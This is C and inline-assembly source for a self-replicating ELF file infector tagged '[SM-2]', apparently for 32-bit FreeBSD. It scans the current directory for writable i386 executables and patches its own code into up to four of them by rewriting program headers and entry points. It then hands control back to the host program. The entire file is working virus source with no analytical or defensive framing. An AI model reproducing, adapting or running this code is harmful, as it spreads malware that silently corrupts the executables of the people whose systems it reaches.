#include <sys/types.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <unistd.h>
#include <elf.h>
#include <fcntl.h>

#define MAX_FILE_SIZE 15728640
#define MAX_DIR_SIZE 15728640
#define NUM 0x4

enum {false, true};

typedef struct {
	void *dir_map;
	int dir_siz;
	void *dir_ptr;
	void *dir_end;
	uid_t euid;
	char *fn;
	int n;
	struct stat fstat;
} find_elf_data;

typedef struct {
	int host_ep;
	int s1_vaddr;
	int s1_memsz;
	int s1_flags;
	int s2_vaddr;
	int s2_memsz;
	int s2_flags;
} code_data;

typedef struct {
	char *addr;
	int size;
} obj_map;


void fix_offs(Elf32_Ehdr *, int, int);
void copy(char *, char *, int);
void code_end(void);
void restore(void);
void code_start(void);
int digest_phdr(Elf32_Ehdr *, Elf32_Phdr *[], int *);
int expand_file(obj_map *, int, int);
int inject(int, int, int, int);
int find_elf(find_elf_data *);
int int0x80(int, ...);
int turn_flags(int);


int main()
{
	code_start();
	return 0;
}

asm(
"		.set	MPROTECT,74		\n"	/* Check it for your version */
"		.globl	restore			\n"
"restore:	call	1f			\n"
"1:		popl	%eax			\n"
"		addl	$(code_end-1b),%eax	\n"
"		pushal				\n"
"		movl	%esp,%ebp		\n"
"1:		movl	%eax,%esp		\n"
"		movl	$MPROTECT,%eax		\n"
"		int 	$0x80			\n"	/* Don't care CF */
"		addl	$0x0C,%esp		\n"
"		movl	$MPROTECT,%eax		\n"
"		int	$0x80			\n"	/* Don't care CF */
"		movl	%ebp,%esp		\n"
"		call	code_start		\n"
"		popal				\n"
"		movl	(%eax),%eax		\n"
"		jmp	*%eax			\n"
);

void code_start()
{
	int code_addr, code_size, fd;
	find_elf_data fed;

	__asm__ __volatile__(
"		call 1f				\n"
"id:		.asciz \"[SM-2]\"		\n"
"1:		popl %0				\n"
"		subl $(id-restore),%0		\n"
		:"=q"(code_addr)
	);
	code_size = &code_end - &restore;
	fed.dir_map = NULL;
	fed.n = 0x0;

	while (find_elf(&fed)) {
		int0x80(SYS_chmod, fed.fn, (mode_t)fed.fstat.st_mode|S_IRUSR|S_IWUSR);

		if ((fd = int0x80(SYS_open, fed.fn, O_RDWR)) >= 0) {
			fed.n += inject(code_addr, code_size, fd, fed.fstat.st_size);
			if (int0x80(SYS_close, fd))
				fed.n = NUM;
		}

		int0x80(SYS_chmod, fed.fn, (mode_t)fed.fstat.st_mode);
	}
}

int inject(int code_addr, int code_size, int obj_fd, int obj_size)
{
	struct iovec iov[3];
	Elf32_Phdr *phl[2];
	Elf32_Ehdr *eh;
	obj_map object;
	code_data cd;
	int expand_size, expand_point;
	int file_dist, mem_dist;
	int status, base_addr;

	status = false;

	if ((eh = (Elf32_Ehdr *)int0x80(SYS_mmap, NULL, (size_t)obj_size,
	    PROT_READ|PROT_WRITE, MAP_PRIVATE, obj_fd, (off_t)0)) == MAP_FAILED)
	    	return status;
	object.addr = (char *)eh;
	object.size = obj_size;

	if (digest_phdr(eh, phl, &base_addr))
		goto unmap;
	file_dist = phl[1]->p_offset - phl[0]->p_offset;
	mem_dist = phl[1]->p_vaddr - phl[0]->p_vaddr;
	if (file_dist > mem_dist || (expand_size = mem_dist - file_dist) > 0x1000)
		goto unmap;
	if (expand_size) {
		expand_point = phl[1]->p_offset;
		obj_size += expand_size;
	}
	cd.host_ep = eh->e_entry;
	cd.s1_vaddr = phl[0]->p_vaddr;
	cd.s1_memsz = phl[0]->p_memsz;
	cd.s1_flags = turn_flags(phl[0]->p_flags);
	cd.s2_vaddr = phl[1]->p_vaddr;
	cd.s2_memsz = phl[1]->p_memsz;
	cd.s2_flags = turn_flags(phl[1]->p_flags);

	eh->e_entry = ((base_addr - code_size - sizeof(cd) - (obj_size & 0xfff))
	    & 0xfffff000) + (obj_size & 0xfff);

	phl[1]->p_offset = phl[0]->p_offset;
	phl[1]->p_vaddr  = phl[1]->p_paddr = phl[0]->p_vaddr;
	phl[1]->p_filesz += mem_dist;
	phl[1]->p_memsz  += mem_dist;
	phl[1]->p_flags  = PF_R|PF_W;
	phl[0]->p_offset = obj_size;
	phl[0]->p_vaddr  = phl[0]->p_paddr = eh->e_entry;
	phl[0]->p_filesz = phl[0]->p_memsz = code_size + sizeof(cd);
	phl[0]->p_flags  = PF_R|PF_X;

	if (expand_size) {
		fix_offs(eh, expand_point, expand_size);
		if (expand_file(&object, expand_point, expand_size))
			goto unmap;
	}

	iov[0].iov_base = object.addr;
	iov[0].iov_len  = object.size;
	iov[1].iov_base = (void *)code_addr;
	iov[1].iov_len  = code_size;
	iov[2].iov_base = &cd;
	iov[2].iov_len  = sizeof(cd);
	if (int0x80(SYS_writev, obj_fd, iov, 3) == object.size +
	    code_size + sizeof(cd))
		status = true;

unmap:	int0x80(SYS_munmap, object.addr, object.size);
	return status;
}

void fix_offs(Elf32_Ehdr *eh, int expand_point, int expand_size)
{
	Elf32_Phdr *phtab;
	Elf32_Shdr *shtab;
	int i;

	shtab = (void *)eh + eh->e_shoff;
	phtab = (void *)eh + eh->e_phoff;

	if (eh->e_shoff >= expand_point)
		eh->e_shoff += expand_size;
	if (eh->e_phoff >= expand_point)
		eh->e_phoff += expand_size;

	for (i = 0; i < eh->e_shnum; i++)
		if (shtab[i].sh_offset >= expand_point)
			shtab[i].sh_offset += expand_size;

	for (i = 0; i < eh->e_phnum; i++)
		if (phtab[i].p_type != PT_LOAD && phtab[i].p_offset >= expand_point)
			phtab[i].p_offset += expand_size;
}

int expand_file(obj_map *object, int exp_point, int exp_size)
{
	char *buf;

	if ((buf = (char *)int0x80(SYS_mmap, NULL, (size_t)(object->size + exp_size),
    	    PROT_READ|PROT_WRITE, MAP_ANON, -1, (off_t)0)) == MAP_FAILED)
    		return 1;

	copy(object->addr, buf, exp_point);
	copy(object->addr + exp_point, buf + exp_point + exp_size, object->size - exp_point);

	int0x80(SYS_munmap, object->addr, object->size);
	object->addr = buf;
	object->size += exp_size;
	return 0;
}

asm(
"		.globl	copy			\n"
"copy:		pushal				\n"
"		movl	0x24(%esp),%esi		\n"
"		movl	0x28(%esp),%edi		\n"
"		movl	0x2C(%esp),%ecx		\n"
"		cld				\n"
"		rep				\n"
"		movsb				\n"
"		popal				\n"
"		ret				\n"
);

int digest_phdr(Elf32_Ehdr *eh, Elf32_Phdr *phl[], int *base_addr)
{
	Elf32_Phdr *ph, *phend;
	int i;

	ph = (void *)eh + eh->e_phoff;
	phend = (void *)ph + eh->e_phnum * sizeof(Elf32_Phdr);
	for (i = 0; ph < phend; ++ph)
		if (ph->p_type == PT_LOAD) {
			if (i >= 2)
				return 1;
			phl[i++] = ph;
		}
	if (i != 2 || eh->e_entry == phl[0]->p_vaddr ||
	    phl[0]->p_vaddr > phl[1]->p_vaddr || phl[0]->p_filesz != phl[0]->p_memsz)
		return 1;
	*base_addr = phl[0]->p_vaddr & 0xfffff000;
	return 0;
}

asm(
"		.globl	turn_flags		\n"
"turn_flags:	pushl	%ecx			\n"
"		pushl	%edx			\n"
"		movl	0xC(%esp),%edx		\n"
"		xorl	%eax,%eax		\n"
"		movl	$0x3,%ecx		\n"
"1:		rcrl	$0x1,%edx		\n"
"		rcll	$0x1,%eax		\n"
"		loop	1b			\n"
"		popl	%edx			\n"
"		popl	%ecx			\n"
"		ret				\n"
);

int find_elf(find_elf_data *fed)
{
	Elf32_Ehdr ehdr;
	struct dirent *e;
	struct stat s;
	int fn, fd, n;
	void *p;

	if (fed->dir_map == NULL) {
		fn = '.';
		if (int0x80(SYS_stat, &fn, &s))
			return 0;
		if (s.st_size > MAX_DIR_SIZE)
			return 0;
		if ((p = (void *)int0x80(SYS_mmap, NULL, (size_t)s.st_size,
		    PROT_READ|PROT_WRITE, MAP_ANON, -1, (off_t)0)) == MAP_FAILED)
			return 0;
		if ((fd = int0x80(SYS_open, &fn, O_RDONLY)) < 0)
			return 0;		/* munmap() */
		if (int0x80(SYS_getdents, fd, (char *)p, (int)s.st_size) != (int)s.st_size)
			return 0;		/* munmap(), close() */
		if (int0x80(SYS_close, fd))
			return 0;		/* munmap() */

		fed->dir_map = fed->dir_ptr = p;
		fed->dir_siz = (int)s.st_size;
		fed->dir_end = p + (int)s.st_size;
		fed->euid = int0x80(SYS_geteuid);
	}

	if (fed->n >= NUM)
		goto end;

	for (e = p = fed->dir_ptr; p < fed->dir_end && e->d_reclen; e = p += e->d_reclen) {
		if (e->d_type != DT_REG || e->d_fileno == 0)
			continue;
		if (int0x80(SYS_stat, &e->d_name, &fed->fstat))
			continue;
		if (!(fed->fstat.st_mode & (mode_t)(S_IXUSR|S_IXGRP|S_IXOTH)))
			continue;
		if (fed->fstat.st_uid != fed->euid &&
		    int0x80(SYS_eaccess, &e->d_name, R_OK|W_OK))
		    	continue;
		if (fed->fstat.st_size < sizeof(ehdr) ||
		    fed->fstat.st_size > MAX_FILE_SIZE)
			continue;

		if ((fd = int0x80(SYS_open, &e->d_name, O_RDONLY)) < 0)
			continue;
		n = int0x80(SYS_read, fd, (char *)&ehdr, (size_t)sizeof(ehdr));
		if (int0x80(SYS_close, fd))
			break;
		if (n != sizeof(ehdr))
			continue;
		
		if (*(int *)&ehdr.e_ident[0] != 0x464C457F || 
		    *(int *)&ehdr.e_ident[4] != 0x09010101 ||
		    ehdr.e_type != ET_EXEC || ehdr.e_machine != EM_386 ||
		    ehdr.e_version != EV_CURRENT || !ehdr.e_entry ||
		    ehdr.e_ehsize != sizeof(ehdr) || !ehdr.e_shstrndx ||
		    !ehdr.e_phoff || ehdr.e_phentsize != sizeof(Elf32_Phdr) ||
		    !ehdr.e_shoff || ehdr.e_shentsize != sizeof(Elf32_Shdr) ||
		    !ehdr.e_phnum || !ehdr.e_shnum || ehdr.e_phnum == PN_XNUM)
		    	continue;
		
		fed->fn = (char *)&e->d_name;
		fed->dir_ptr = p + e->d_reclen;
		return 1;
	}

end:	int0x80(SYS_munmap, fed->dir_map, fed->dir_siz);
	return 0;
}

asm(
"		.globl	int0x80			\n"
"int0x80:	popl	%ecx			\n"
"		popl	%eax			\n"
"		pushl	%ecx			\n"
"		int	$0x80			\n"
"		jnc	1f			\n"
"		xorl	%eax,%eax		\n"
"		decl	%eax			\n"
"1:		pushl	%ecx			\n"
"		ret				\n"
);

void code_end() {};
